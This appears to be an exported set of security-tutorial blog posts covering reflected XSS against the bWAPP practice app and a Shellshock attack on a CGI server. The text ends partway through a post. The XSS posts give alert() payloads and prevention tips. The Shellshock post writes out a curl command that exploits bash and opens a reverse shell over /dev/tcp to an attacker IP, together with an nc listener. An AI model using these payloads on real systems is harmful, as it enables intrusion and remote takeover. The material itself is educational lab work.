size='"4'"><br></font></div><div style='"text-indent: 4.08px;'"><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-custom-header/cross_site_scripting_reflected%20_custom_header_9.png'"><font size='"4'"><br></font></div><div style='"text-indent: 4.08px;'"><font size='"4'">Now in bWAPP custom HTTP header add the payload as</font><br></div><div style='"text-indent: 4.08px;'"><font size='"4'"><br></font></div><div style='"text-indent: 4.08px;'"><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-custom-header/cross_site_scripting_reflected%20_custom_header_10.png'"></div><div style='"text-indent: 4.08px;'"><br></div><div><div class='"code-toolbar'"><pre class='"  language-js'"><code class='"  language-js'"><span class='"token operator'">&lt;</span>script<span class='"token operator'">&gt;</span><span class='"token function'">alert</span><span class='"token punctuation'">(</span><span class='"token string'">''This is a buggy custom header''</span><span class='"token punctuation'">)</span><span class='"token operator'">&lt;</span><span class='"token operator'">/</span>script<span class='"token operator'">&gt;</span></code></pre><div class='"toolbar'"><div class='"toolbar-item'"><button type='"button'">Copy</button></div></div></div><br></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-custom-header/cross_site_scripting_reflected%20_custom_header_11.png'"><br></div><div><br></div><div><font size='"4'">As you can see here we are able to inject the JavaScript payload in '"Custom HTTP header'".</font><br></div><div><font size='"4'"><br></font></div><div><b style='"'"><font size='"5'">How do we prevent this attack?</font></b><br></div><div><b style='"'"><font size='"5'"><br></font></b></div><div><ol><li><font size='"4'">User input needs to be encoded in the HTTP header and developer can implement filters which will eliminate any scripting tags.</font><br></li><li><font size='"4'">And in some cases, X-XSS-Protection header can prevent some level of XSS (cross-site-scripting) attacks as it''s an add-on to the browsers to sanitize HTML responses.</font></li></ol><div><font size='"4'"><br></font></div></div><div><span style='"font-size: large;'">Thank you for reading this post and Happy Hacking :)</span></div>",t,f,"",f
5,Cross-Site-Scripting - Reflected (JSON),cross-site-scripting-reflected-json,Anshuman Pattnaik,2019-05-18 01:25:13.509969+05:30,2021-06-04 01:32:48.304421+05:30,https://assets.hackbotone.com/assets/cross-site-scripting-reflected-json/seo_thumbnail.png,https://assets.hackbotone.com/assets/cross-site-scripting-reflected-json/small_thumbnail.png,https://assets.hackbotone.com/assets/cross-site-scripting-reflected-json/large_thumbnail.png,"{'"Bug Bounty'",'"Reflected XSS'",bWAPP,XSS}","This is the demonstration of Cross-scripting — Reflected attack on JSON response and for this demo, I’ll be using bWAPP and bWAPP is a buggy web application and we can use to test various vulnerabilities in the web.","<div><font size='"4'">This is the demonstration of <b>Cross-scripting - Reflected attack on JSON</b> response and for this demo, I''ll be using bWAPP which is a buggy web application and we can use to test various vulnerabilities in the web.</font></div><div><font size='"4'"><br></font></div><div><font size='"4'">bWAPP Official Link:- <a href='"http://www.itsecgames.com/'"><font color='"#dd4124'">http://www.itsecgames.com/</font></a></font></div><div><font size='"4'"><br></font></div><div><div class='"video-responsive'">
    <iframe width='"420'" height='"315'" src='"https://www.youtube.com/embed/PR-99Eh1tsE'" frameborder='"0'" allowfullscreen='"'"></iframe></div></div><div><br></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-json/cross_site_scripting_reflected_json_1.png'"><br></div><div><br></div><div><font size='"4'">Now please choose <b>Cross-site-Scripting - Reflected (JSON )</b> from the drop-down menu and click Hack.</font><br></div><div><font size='"4'"><br></font></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-json/cross_site_scripting_reflected_json_2.png'"><font size='"4'"><br></font></div><div><br></div><div><div><font size='"4'">As you can see here on this web page one input box is there and it''s asking the user to enter movie name. So let''s enter a movie name, for example, <b>Skyfall </b>and click Search.</font></div></div><div><font size='"4'"><br></font></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-json/cross_site_scripting_reflected_json_3.png'"><font size='"4'"><br></font></div><div><br></div><div><div><font size='"4'">Now you can see here Movie name is reflecting in both address bar and on the webpage and if the output got reflected on the address bar or on the web page then we can inject our payload. So let''s try to inject our payload.</font></div></div><div><font size='"4'"><br></font></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-json/cross_site_scripting_reflected_json_4.png'"><font size='"4'"><br></font></div><div><br></div><div><div class='"code-toolbar'"><pre class='"  language-js'"><code class='"  language-js'"><span class='"token operator'">&lt;</span>script<span class='"token operator'">&gt;</span><span class='"token function'">alert</span><span class='"token punctuation'">(</span><span class='"token string'">''Skyfall''</span><span class='"token punctuation'">)</span><span class='"token operator'">&lt;</span><span class='"token operator'">/</span>script<span class='"token operator'">&gt;</span></code></pre><div class='"toolbar'"><div class='"toolbar-item'"><button type='"button'">Copy</button></div></div></div><br></div><div><font size='"4'">And click Search. We will try to display the movie name on an alert dialogue box.</font><br></div><div><font size='"4'"><br></font></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-json/cross_site_scripting_reflected_json_5.png'"><font size='"4'"><br></font></div><div><br></div><div><font size='"4'">As you can see our payload didn''t work so one thing you always remember that whenever the output reflected on the webpage first thing try to check the view page source of that web page in that way you can able to understand the DOM structure of that particular HTML element. And then only you can able to inject your payload.</font><br></div><div><br></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-json/cross_site_scripting_reflected_json_6.png'"><br></div><div><font size='"4'">Now you can see above our entire statement is within double quotes and when the web page executed from the top and when it reaches to the <b>&lt;script&gt;</b> tag and you can see the first statement is not yet close and we are trying to inject our JavaScript&nbsp;code, so in order to execute our payload first we need to close the current statement and inject our payload as a new statement in that way we can able to execute our current payload.</font><br></div><div><font size='"4'"><br></font></div><div><b style='"'"><font size='"5'">Steps to create the payload</font></b><br></div><div><font size='"4'"><br></font></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-json/cross_site_scripting_reflected_json_7.png'"><font size='"4'"><br></font></div><div><br></div><div><b><font size='"5'">Step 1</font></b></div><div><b><font size='"5'"><br></font></b></div><div><div class='"code-toolbar'"><pre class='" language-js'">'"}]}'';<br></pre><div class='"toolbar'"><div class='"toolbar-item'"><button type='"button'">Copy</button></div></div></div><br></div><div><font size='"4'">Close all opening/closing curly braces, square brackets and single quote and remember to add the semicolon at the end of the statement to terminate the statement.</font><br></div><div><font size='"4'"><br></font></div><div><b style='"'"><font size='"5'">Step 2</font></b><br></div><div><br></div><div><div class='"code-toolbar'"><pre class='"  language-js'"><code class='"  language-js'"><span class='"token function'">alert</span><span class='"token punctuation'">(</span><span class='"token string'">''Skyfall''</span><span class='"token punctuation'">)</span><span class='"token operator'">&lt;</span><span class='"token operator'">/</span>script<span class='"token operator'">&gt;</span></code></pre><div class='"toolbar'"><div class='"toolbar-item'"><button type='"button'">Copy</button></div></div></div><br></div><div><font size='"4'">This will be our payload because it''s already started one <b>&lt;script&gt;</b> tag so no need to start another <b>&lt;script&gt;</b> tag again and only we need to show the alert dialogue and close the <b>&lt;/script&gt;</b> tag.</font><br></div><div><br></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-json/cross_site_scripting_reflected_json_8.png'"><br></div><div><br></div><div><div><font size='"4'">As you can see we are able to show the movie name on an alert dialogue box.&nbsp;</font><span style='"font-size: large;'">So in this way, we need to understand the </span><b style='"font-size: large;'">DOM (Document Object Model)</b><span style='"font-size: large;'"> of the web page and after that, you can able to inject your payload.</span></div></div><div><br></div><div><b><font size='"5'">How do we prevent this type of attack?</font></b></div><div><b><font size='"5'"><br></font></b></div><div><ol><li><font size='"4'">Encode unsafe characters in the response</font><br></li><li><font size='"4'">On every Http request set the Content-Type to application/json, and set X-Content-Type-Options: nosniff so that it will instruct the browsers to disable the MIME sniffing.<br></font></li></ol><div><b style='"font-size: large;'"><br></b></div><div><b style='"'"><font size='"5'">For more information please follow the below links.</font></b><br></div></div><div><b style='"'"><font size='"5'"><br></font></b></div><div><ol><li><font size='"4'"><a href='"https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet'"><font color='"#dd4124'">Testing for AJAX Vulnerabilities (OWASP-AJ-001)</font></a></font><br></li><li><font size='"4'"><a href='"https://github.com/OWASP/CheatSheetSeries'"><font color='"#dd4124'">XSS (Cross Site Scripting) Prevention Cheat Sheet</font></a><br></font></li><li><font size='"4'"><a href='"https://erlend.oftedal.no/blog/static-127.html?blogid=127'"><font color='"#dd4124'">OWASP Top 10 for JavaScript - A2: Cross Site Scripting - XSS</font></a></font><br></li></ol></div><div><font size='"4'"><br></font></div><div><span style='"font-size: large;'">Thank you for reading this post and Happy Hacking :)</span></div>",t,f,"",f
10,Cross-Site-Scripting - Reflected (User-Agent),cross-site-scripting-reflected-user-agent,Anshuman Pattnaik,2019-05-25 01:25:59.609767+05:30,2021-06-04 01:33:01.72663+05:30,https://assets.hackbotone.com/assets/cross-site-scripting-reflected-user-agent/seo_thumbnail.png,https://assets.hackbotone.com/assets/cross-site-scripting-reflected-user-agent/small_thumbnail.png,https://assets.hackbotone.com/assets/cross-site-scripting-reflected-user-agent/large_thumbnail.png,"{XSS,bWAPP,'"Reflected XSS'",User-Agent}","This is the demonstration of Cross-Site Scripting attack in User-Agent header and for this demo, I’ll be using bWAPP and bWAPP is a buggy web application and we can use to test various vulnerabilities in the web.","<div><font size='"4'">This is the demonstration of Cross-Site Scripting attack in User-Agent header and for this demo, I''ll be using bWAPP which is a buggy web application and we can use to test various vulnerabilities in the web.</font></div><div><font size='"4'"><br></font></div><div><font size='"4'">bWAPP Official Link:- <a href='"http://www.itsecgames.com/'"><font color='"#dd4124'">http://www.itsecgames.com/</font></a></font></div><div><br></div><div><div class='"video-responsive'">
    <iframe width='"420'" height='"315'" src='"https://www.youtube.com/embed/Ks9Jcu60tTk'" frameborder='"0'" allowfullscreen='"'"></iframe></div></div><div><br></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-user-agent/cross_site_scripting_reflected_user_agent_1.png'"><br></div><div><br></div><div><font size='"4'">Now please choose <b>Cross-site-Scripting - Reflected (User-Agent Header)</b> from the drop-down menu and click Hack.</font><br></div><div><font size='"4'"><br></font></div><div><b style='"'"><font size='"5'">What is User-Agent header?</font></b><br></div><div><font size='"4'"><br></font></div><div><div><font size='"4'">A user-agent request header will act on behalf of the user and it allows the network protocol peers to identify the application type, operating system and software version.&nbsp;And Content-Type is the best example for custom HTTP header and from this header parameter, we are sending data in different formats either from (JSON or XML).</font></div><div><font size='"4'"><br></font></div><div><font size='"4'">For example:- Suppose I''ll open one website on a mobile phone and it should be responsive and it shouldn''t load the desktop webpage it should load the mobile phone webpage. And by the help of User-Agent, we can get able to load the proper web page on the devices.</font></div></div><div><font size='"4'"><br></font></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-user-agent/cross_site_scripting_reflected_user_agent_2.png'"><font size='"4'"><br></font></div><div><br></div><div><div><font size='"4'">As you can see here it''s able to identify my browser version, operating system and some other details. So our goal is to intercept this request and inject the payload to this header parameter. To inject the payload, we need to intercept the HTTP request and we can use Burp suite.</font></div></div><div><font size='"4'"><br></font></div><div><b style='"'"><font size='"5'">What is Burp Suite?</font></b><br></div><div><font size='"4'"><br></font></div><div><div style='"'"><font size='"4'">Burp suite is a graphical tool which is used to test Web application security and by the help of this tool, we can identify the vulnerability in the web. If you want to know more about this tool then you can visit their official website <a href='"https://portswigger.net/'"><font color='"#dd4124'">PortSwigger</font></a>.</font></div></div><div style='"'"><font size='"4'"><br></font></div><div style='"'"><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-user-agent/cross_site_scripting_reflected_user_agent_3.png'"><font size='"4'"><br></font></div><div style='"'"><font size='"4'">So to intercept the first request go to the proxy tab and click on the intercept button to start intercepting the HTTP request.</font><br></div><div style='"'"><font size='"4'"><br></font></div><div style='"'"><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-user-agent/cross_site_scripting_reflected_user_agent_4.png'"><font size='"4'"><br></font></div><div style='"'"><br></div><div style='"'"><font size='"4'">And after that go to the portal page and choose <b>(Cross-Site Scripting - Reflected User-Agent Header)</b> and click Hack.</font><br></div><div style='"'"><font size='"4'"><br></font></div><div style='"'"><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-user-agent/cross_site_scripting_reflected_user_agent_5.png'"><font size='"4'"><br></font></div><div style='"'"><br></div><div style='"'"><font size='"4'">So now if you go to the Burp you can able to see the intercept request and click forward until you reach the '"<b>xss_user_agent.php</b>'" page.</font><br></div><div style='"'"><font size='"4'"><br></font></div><div style='"'"><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-user-agent/cross_site_scripting_reflected_user_agent_6.png'"><font size='"4'"><br></font></div><div style='"'"><font size='"4'">Now to test let''s give a simple message '"<i>This is a buggy User-Agent header</i>'" and click forward.</font><br></div><div style='"'"><font size='"4'"><br></font></div><div style='"'"><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-user-agent/cross_site_scripting_reflected_user_agent_7.png'"><font size='"4'"><br></font></div><div style='"'"><br></div><div style='"'"><font size='"4'">As you can see here the message is reflecting on the webpage as it''s reflecting we can inject our payload.</font><br></div><div style='"'"><font size='"4'"><br></font></div><div style='"'"><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-user-agent/cross_site_scripting_reflected_user_agent_8.png'"><font size='"4'"><br></font></div><div style='"'"><br></div><div style='"'"><font size='"4'">So let''s go to the burp suite and turn off the intercept. And follow the same steps again to intercept the request.</font><br></div><div style='"'"><font size='"4'"><br></font></div><div style='"'"><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-user-agent/cross_site_scripting_reflected_user_agent_9.png'"><font size='"4'"><br></font></div><div style='"'"><br></div><div style='"'"><font size='"4'">Now inject the payload to '"User-Agent'" header parameter.</font><br></div><div style='"'"><font size='"4'"><br></font></div><div style='"'"><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-user-agent/cross_site_scripting_reflected_user_agent_10.png'"></div><div style='"'"><br></div><div><div class='"code-toolbar'"><pre class='" language-js'"><code class='" language-js'">&lt;script&gt;alert(''This is a buggy User-Agent header'')&lt;/script&gt;</code></pre><div class='"toolbar'"><div class='"toolbar-item'"><button type='"button'">Copy</button></div></div></div><br></div><div><br></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-user-agent/cross_site_scripting_reflected_user_agent_11.png'"><br></div><div><br></div><div><font size='"4'">As you can see we are able to inject JavaScript code to User-Agent header parameter.</font><br></div><div><font size='"4'"><br></font></div><div><b style='"'"><font size='"5'">How do we prevent this attack?</font></b></div><div><b style='"'"><font size='"5'"><br></font></b></div><div><ol><li><font size='"4'">User input needs to be encoded in the HTTP header and developer can implement filters which will eliminate any scripting tags.<br></font></li><li><font size='"4'">And in some cases, X-XSS-Protection header can prevent some level of XSS (cross-site-scripting) attacks as it''s an add-on to the browsers to sanitize HTML responses.<br></font></li></ol><div><font size='"4'"><br></font></div></div><div><span style='"font-size: large;'">Thank you for reading this post and Happy Hacking :)</span></div>",t,f,"",f
3,Shellshock Attack on a remote web server,shellshock-attack-on-a-remote-web-server,Anshuman Pattnaik,2019-05-16 01:24:52.303415+05:30,2021-06-04 01:34:17.907822+05:30,https://assets.hackbotone.com/assets/shellshock-attack-on-a-remote-web-server/seo_thumbnail.png,https://assets.hackbotone.com/assets/shellshock-attack-on-a-remote-web-server/small_thumbnail.png,https://assets.hackbotone.com/assets/shellshock-attack-on-a-remote-web-server/large_thumbnail.png,"{CGI,'"Reverse Shell'",'"Remote Code Execution'"}",CGI runs bash as their default request handler and this attack does not require any authentication that’s why most of the attack is taken place on CGI pages to exploit this vulnerability.,"<font size='"4'">CGI runs bash as their default request handler and this attack does not require any authentication that''s why most of the attack is taken place on CGI pages to exploit this vulnerability.</font><div><font size='"4'"><br></font></div><div><div class='"video-responsive'">
    <iframe width='"420'" height='"315'" src='"https://www.youtube.com/embed/dTtLbRq76Dw'" frameborder='"0'" allowfullscreen='"'"></iframe></div></div><div><br></div><div><div class='"video-responsive'">
    <iframe width='"420'" height='"315'" src='"https://www.youtube.com/embed/6cvkpJOQN90'" frameborder='"0'" allowfullscreen='"'"></iframe></div></div><div><br></div><div><b><font size='"5'">Exploitation Demo</font></b></div><div><br></div><div><font size='"4'">First create a CGI script called <b>'"helloworld.cgi'"</b> and this script we will create under <b>/usr/lib/cgi-bin</b> directory.</font><br></div><div><font size='"4'"><br></font></div><div><img src='"https://assets.hackbotone.com/assets/shellshock-attack-on-a-remote-web-server/shell_1.png'"><font size='"4'"><br></font></div><div><br></div><div><font size='"4'">Now let''s write a very simple hello world script and save it. Set its permission to 755 (so it is executable)</font><br></div><div><font size='"4'"><br></font></div><div><img src='"https://assets.hackbotone.com/assets/shellshock-attack-on-a-remote-web-server/shell_2.png'"><font size='"4'"><br></font></div><div><br></div><div><img src='"https://assets.hackbotone.com/assets/shellshock-attack-on-a-remote-web-server/shell_3.png'"><br></div><div><br></div><div><font size='"4'">To test this go to the browser and type this URL:- <a href='"http://localhost/cgi-bin/helloworld.cgi'"><font color='"#dd4124'">http://localhost/cgi-bin/helloworld.cgi</font></a> and hit enter.</font><br></div><div><font size='"4'"><br></font></div><div><img src='"https://assets.hackbotone.com/assets/shellshock-attack-on-a-remote-web-server/shell_4.png'"><font size='"4'"><br></font></div><div><br></div><div><font size='"4'">So here you can see it printed <i>Hello World</i> so there is no problem in our script now we have created one CGI script on the victim machine. Now let''s move on to Attacker machine.&nbsp;</font><br></div><div><font size='"4'"><br></font></div><div><img src='"https://assets.hackbotone.com/assets/shellshock-attack-on-a-remote-web-server/shell_5.png'"><font size='"4'"><br></font></div><div><br></div><div><font size='"4'">So here I am running Ubuntu 18.04 Operating System and from this system, I''ll launch my attack on victim machine through the reverse shell.</font><br></div><div><font size='"4'"><br></font></div><div><b style='"'"><font size='"5'">What is a reverse shell?</font></b><br></div><div><b style='"'"><font size='"5'"><br></font></b></div><div><font size='"4'">A reverse shell is a process which will start on one machine, and its input and output are controlled by an attacker from a remote computer the shell runs on the victim''s machine, but it will take the input from the attacker machine and also prints its output on the attacker''s machine. Reverse shell will give the attacker a convenient way to run commands on a compromised machine.</font><br></div><div><font size='"4'"><br></font></div><div><img src='"https://assets.hackbotone.com/assets/shellshock-attack-on-a-remote-web-server/shell_6.png'"><font size='"4'"><br></font></div><div><font size='"4'"><br></font></div><div><font size='"4'">So here you can see I am running two terminals and in one terminal I''ll enter the netcat command and wait for the connection. And in the second terminal, I''ll execute the curl command to connect with the bash.</font><br></div><div><br></div><div><div class='"code-toolbar'"><pre class='"  language-js'"><code class='"  language-js'">nc <span class='"token operator'">-</span>l <span class='"token number'">9000</span> <span class='"token operator'">-</span>v</code></pre><div class='"toolbar'"><div class='"toolbar-item'"><button type='"button'">Copy</button></div></div></div><br></div><div><br></div><div><img src='"https://assets.hackbotone.com/assets/shellshock-attack-on-a-remote-web-server/shell_7.png'"><br></div><div><br></div><div><font size='"4'">If you want to know more about netcat then please follow these below links.</font><br></div><div><font size='"4'"><br></font></div><div><b style='"'"><font size='"5'">Netcat</font></b></div><div><ol><li><font size='"4'"><a href='"https://en.wikipedia.org/wiki/Netcat'"><font color='"#dd4124'">https://en.wikipedia.org/wiki/Netcat</font></a></font><br></li><li><font size='"4'"><a href='"http://netcat.sourceforge.net/'"><font color='"#dd4124'">http://netcat.sourceforge.net/</font></a></font><br></li></ol></div><div><b style='"'"><font size='"5'"><br></font></b></div><div><font size='"4'">And in the second terminal, I will execute the curl command to starts a bash shell on the attacker machine.</font><br></div><div><br></div><div><div class='"code-toolbar'"><pre class='"  language-js'"><code class='"  language-js'">curl <span class='"token operator'">-</span><span class='"token constant'">A</span> <span class='"token string'">'"() { :; }; /bin/bash -i &gt; /dev/tcp/192.168.2.13/9000 0&lt;&amp;1 2&gt;&amp;1'"</span>http<span class='"token operator'">:</span><span class='"token operator'">/</span><span class='"token operator'">/</span><span class='"token number'">192.168</span><span class='"token number'">.2</span><span class='"token number'">.18</span><span class='"token operator'">/</span>cgi<span class='"token operator'">-</span>bin<span class='"token operator'">/</span>helloworld<span class='"token punctuation'">.</span><span class='"token property-access'">cgi</span></code></pre><div class='"toolbar'"><div class='"toolbar-item'"><button type='"button'">Copy</button></div></div></div><br></div><div><div><font size='"4'">Victim machine IP Address - 192.168.2.18</font></div><div><font size='"4'">Attacker Machine IP Address - 192.168.2.13</font></div><div><font size='"4'">Port Number - 9000 - (Any number you can use it''s only used for TCP Connection)</font><br></div></div><div><font size='"4'"><br></font></div><div><img src='"https://assets.hackbotone.com/assets/shellshock-attack-on-a-remote-web-server/shell_8.png'"><font size='"4'"><br></font></div><div><br></div><div><b><font size='"5'">Don''t worry I''ll explain each &amp; every command.</font></b></div><div><ol><li><font size='"4'"><i>'"/bin/bash -i'"</i>: The option I stands for interactive, meaning that the shell must be interactive (must provide a shell prompt).</font><br></li><li><font size='"4'">'"&gt; /dev/tcp/192.168.2.13/9000'": This causes the output device (stdout) of the shell to be redirected to the TCP connection to 192.168.2.13 = port 9000. In Unix systems, stdout''s file descriptor is 1.<br></font></li><li><font size='"4'">'"0&lt;&amp;1'": File descriptor 0 represents the standard input device (stdin). This option tells the system to use the standard output device as the standard input device. Since stdout is already redirected to the TCP connection, this option basically indicates that the shell program will get its input from the same TCP connection.<br></font></li><li><font size='"4'">'"2&gt;&amp;1'": File descriptor 2 represents the standard error stderr. This causes the error output to be redirected to stdout, which is the TCP connection.<br></font></li></ol><div><font size='"4'"><br></font></div></div><div><div style='"'"><font size='"4'">In summary, the command '"/bin/bash -i &gt; /dev/tcp/192.168.2.13/9000 0&lt;&amp;1 2&gt;&amp;1'" starts a bash shell on the server machine, with its input coming from a TCP connection, and output going to the same TCP connection.</font></div><div style='"'"><font size='"4'"><br></font></div><div style='"'"><font size='"4'">When the bash shell command is executed on 192.168.2.18, it connects back to the netcat process started on 192.168.2.13. This is confirmed via the '"Connection from 192.168.2.13 port 9000 [tcp/*] accepted'" message displayed by netcat.</font></div><div style='"'"><font size='"4'"><br></font></div><div style='"'"><font size='"4'">Now hit enter here you can see Connection from 192.168.2.18 44159 received! means now attacker successfully connected to a victim''s machine and you can see here attacker now able see all of his machine details from his terminal.</font></div></div><div style='"'"><font size='"4'"><br></font></div><div style='"'"><img src='"https://assets.hackbotone.com/assets/shellshock-attack-on-a-remote-web-server/shell_9.png'"><font size='"4'"><br></font></div><div style='"'"><br></div><div style='"'"><font size='"4'">We successfully did shellshock attack on a remote server. Now let''s type <b>ls</b> command to check what are the files the Victim has inside <b>/usr/lib/cgi-bin</b> directory.</font><br></div><div style='"'"><font size='"4'"><br></font></div><div style='"'"><img src='"https://assets.hackbotone.com/assets/shellshock-attack-on-a-remote-web-server/shell_10.png'"><font size='"4'"><br></font></div><div style='"'"><br></div><div style='"'"><div><font size='"4'">As you can see from the screenshot attacker can also see <b>helloworld.cgi</b> file and this file has been created from the victim''s machine now whatever changes the victim will do then the attacker can also see all the changes.&nbsp;</font><span style='"font-size: large;'">So in this way, if CGI scripts run older bash than by reverse shell we can easily take over that machine through Remote Code Execution.</span></div><div><span style='"font-size: large;'"><br></span></div><div><b style='"'"><font size='"5'">Important Note</font></b></div></div><div style='"'"><font size='"4'"><br></font></div><div style='"'"><font size='"4'"><i>Please do this experiment on your local machine only means you can use a virtual box and run older Linux OS which is vulnerable and do your experiments but never ever try on live machines because if that machine is running an older bash then you can easily take over that system. And you will definitely face legal actions so I''ll highly recommend trying on your local machine only.</i><br></font></div><div style='"'"><font size='"4'"><i><br></i></font></div><div style='"'"><span style='"font-size: large;'">Thank you for reading this post and Happy Hacking :)</span><font size='"4'"><i><br></i></font></div><div><br></div>",t,f,"",f
8,Cross-site-Scripting - Reflected (Back Button),cross-site-scripting-reflected-back-button,Anshuman Pattnaik,2019-05-23 01:25:41.653798+05:30,2021-06-04 01:32:30.552991+05:30,https://assets.hackbotone.com/assets/cross-site-scripting-reflected-back-button/seo_thumbnail.png,https://assets.hackbotone.com/assets/cross-site-scripting-reflected-back-button/small_thumbnail.png,https://assets.hackbotone.com/assets/cross-site-scripting-reflected-back-button/large_thumbnail.png,"{XSS,bWAPP,'"Reflected XSS'",'"Referer Header'"}","This is the demonstration of Cross-Site Scripting attack in referer header, I’ll be using bWAPP and bWAPP is a buggy web application and we can use to test various vulnerabilities in the web.","<div style='"color: rgb(52, 58, 64); text-indent: 4.08px;'"><font size='"4'">This is the demonstration of Cross-Site Scripting attack in referer header, I''ll be using bWAPP which is a buggy web application and we can use to test various vulnerabilities in&nbsp;</font></div><div style='"color: rgb(52, 58, 64); text-indent: 4.08px;'"><font size='"4'">the web.</font></div><div style='"color: rgb(52, 58, 64); text-indent: 4.08px;'"><font size='"4'"><br></font></div><div style='"text-indent: 4.08px;'"><font size='"4'" style='"'"><font color='"#343a40'">bWAPP Official Link:- </font><a href='"http://www.itsecgames.com/'" style='"'"><font color='"#dd4124'">http://www.itsecgames.com/</font></a></font></div><div style='"color: rgb(52, 58, 64); text-indent: 4.08px;'"><br></div><div style='"color: rgb(52, 58, 64); text-indent: 4.08px;'"><div class='"video-responsive'">
    <iframe width='"420'" height='"315'" src='"https://www.youtube.com/embed/Ks9Jcu60tTk'" frameborder='"0'" allowfullscreen='"'"></iframe></div></div><div style='"color: rgb(52, 58, 64); text-indent: 4.08px;'"><br></div><div style='"color: rgb(52, 58, 64); text-indent: 4.08px;'"><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-back-button/cross_site_scripting_reflected_back%20_button_1.png'"><br></div><div style='"color: rgb(52, 58, 64); text-indent: 4.08px;'"><br></div><div style='"text-indent: 4.08px;'"><font color='"#343a40'" size='"4'">Now please choose <b>Cross-site-Scripting - Reflected (Back Button)</b> from the drop-down menu and click Hack.</font><br></div><div style='"text-indent: 4.08px;'"><font color='"#343a40'" size='"4'"><br></font></div><div style='"text-indent: 4.08px;'"><font color='"#343a40'"><b style='"'"><font size='"5'">What is referer header?</font></b><br></font></div><div style='"text-indent: 4.08px;'"><font color='"#343a40'"><b style='"'"><font size='"5'"><br></font></b></font></div><div style='"text-indent: 4.08px;'"><font color='"#343a40'" size='"4'">It''s an HTTP header field which contains the address of the previous web page from which the currently requested page was followed.</font></div><div style='"text-indent: 4.08px;'"><font color='"#343a40'" size='"4'"><br></font></div><div style='"text-indent: 4.08px;'"><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-back-button/cross_site_scripting_reflected_back%20_button_2.png'"><font color='"#343a40'" size='"4'"><br></font></div><div style='"text-indent: 4.08px;'"><span style='"text-indent: 4.08px; color: rgb(52, 58, 64); font-size: large;'"><br></span></div><div style='"text-indent: 4.08px;'"><span style='"text-indent: 4.08px; color: rgb(52, 58, 64); font-size: large;'">So in this demo, when I will press the back button it will go back to the portal page. Because our demo page was requested by the portal page so that when I press the back button,&nbsp;</span><span style='"text-indent: 4.08px; color: rgb(52, 58, 64); font-size: large;'">in the HTTP referer header the portal page link was defined as a referer.&nbsp;</span><span style='"text-indent: 4.08px; color: rgb(52, 58, 64); font-size: large;'">So in order to inject our payload, we need to intercept the HTTP request of these two pages so that we&nbsp;</span><span style='"color: rgb(52, 58, 64); font-size: large; text-indent: 4.08px;'">can inject our payload to the HTTP Referer header.</span></div><div style='"text-indent: 4.08px;'"><div style='"color: rgb(52, 58, 64); font-size: large; text-indent: 4.08px;'"><span style='"text-indent: 4.08px;'"><br></span></div><div style='"color: rgb(52, 58, 64); font-size: large; text-indent: 4.08px;'"><span style='"text-indent: 4.08px;'">To intercept the request we can use Burp suite.</span><br></div><div style='"color: rgb(52, 58, 64); font-size: large; text-indent: 4.08px;'"><span style='"text-indent: 4.08px;'"><br></span></div><div style='"color: rgb(52, 58, 64); text-indent: 4.08px;'"><span style='"text-indent: 4.08px;'"><b style='"'"><font size='"5'">What is Burp Suite?</font></b><br></span></div><div style='"color: rgb(52, 58, 64); text-indent: 4.08px;'"><span style='"font-size: large; text-indent: 4.08px;'"><br></span></div><div style='"text-indent: 4.08px;'"><span style='"color: rgb(52, 58, 64); font-size: large; text-indent: 4.08px;'">Burp suite is a graphical tool which is used to test Web application security and by the help of this tool, we can identify the vulnerability in the web.&nbsp;</span><span style='"font-size: large; text-indent: 4.08px;'"><font color='"#343a40'">If you want to know more&nbsp;</font></span><font color='"#343a40'" style='"font-size: large; text-indent: 4.08px;'">about this tool then you can visit their official website </font><a href='"https://portswigger.net/'" style='"font-size: large; text-indent: 4.08px;'"><font color='"#dd4124'">Portswigger</font></a><font color='"#343a40'" style='"font-size: large; text-indent: 4.08px;'">.</font></div><div style='"color: rgb(52, 58, 64); text-indent: 4.08px;'"><span style='"text-indent: 4.08px;'"><b style='"'"><font size='"5'"><br></font></b></span></div><div style='"color: rgb(52, 58, 64); text-indent: 4.08px;'"><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-back-button/cross_site_scripting_reflected_back%20_button_3.png'"></div><div style='"color: rgb(52, 58, 64); text-indent: 4.08px;'"><span style='"text-indent: 4.08px;'"><br></span></div><div style='"color: rgb(52, 58, 64); text-indent: 4.08px;'"><span style='"text-indent: 4.08px;'"><font size='"4'">So to intercept the first request go to the proxy tab and click on the intercept button to start intercepting the HTTP request.</font></span></div><div style='"color: rgb(52, 58, 64); text-indent: 4.08px;'"><span style='"text-indent: 4.08px;'"><font size='"4'"><br></font></span></div><div style='"color: rgb(52, 58, 64); text-indent: 4.08px;'"><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-back-button/cross_site_scripting_reflected_back%20_button_4.png'"><span style='"text-indent: 4.08px;'"><b style='"'"><font size='"5'"><br></font></b></span></div><div style='"text-indent: 4.08px;'"><font color='"#343a40'" size='"4'">And now go to the portal page and choose again <b>Cross-site-Scripting - Reflected (Back Button)</b> and 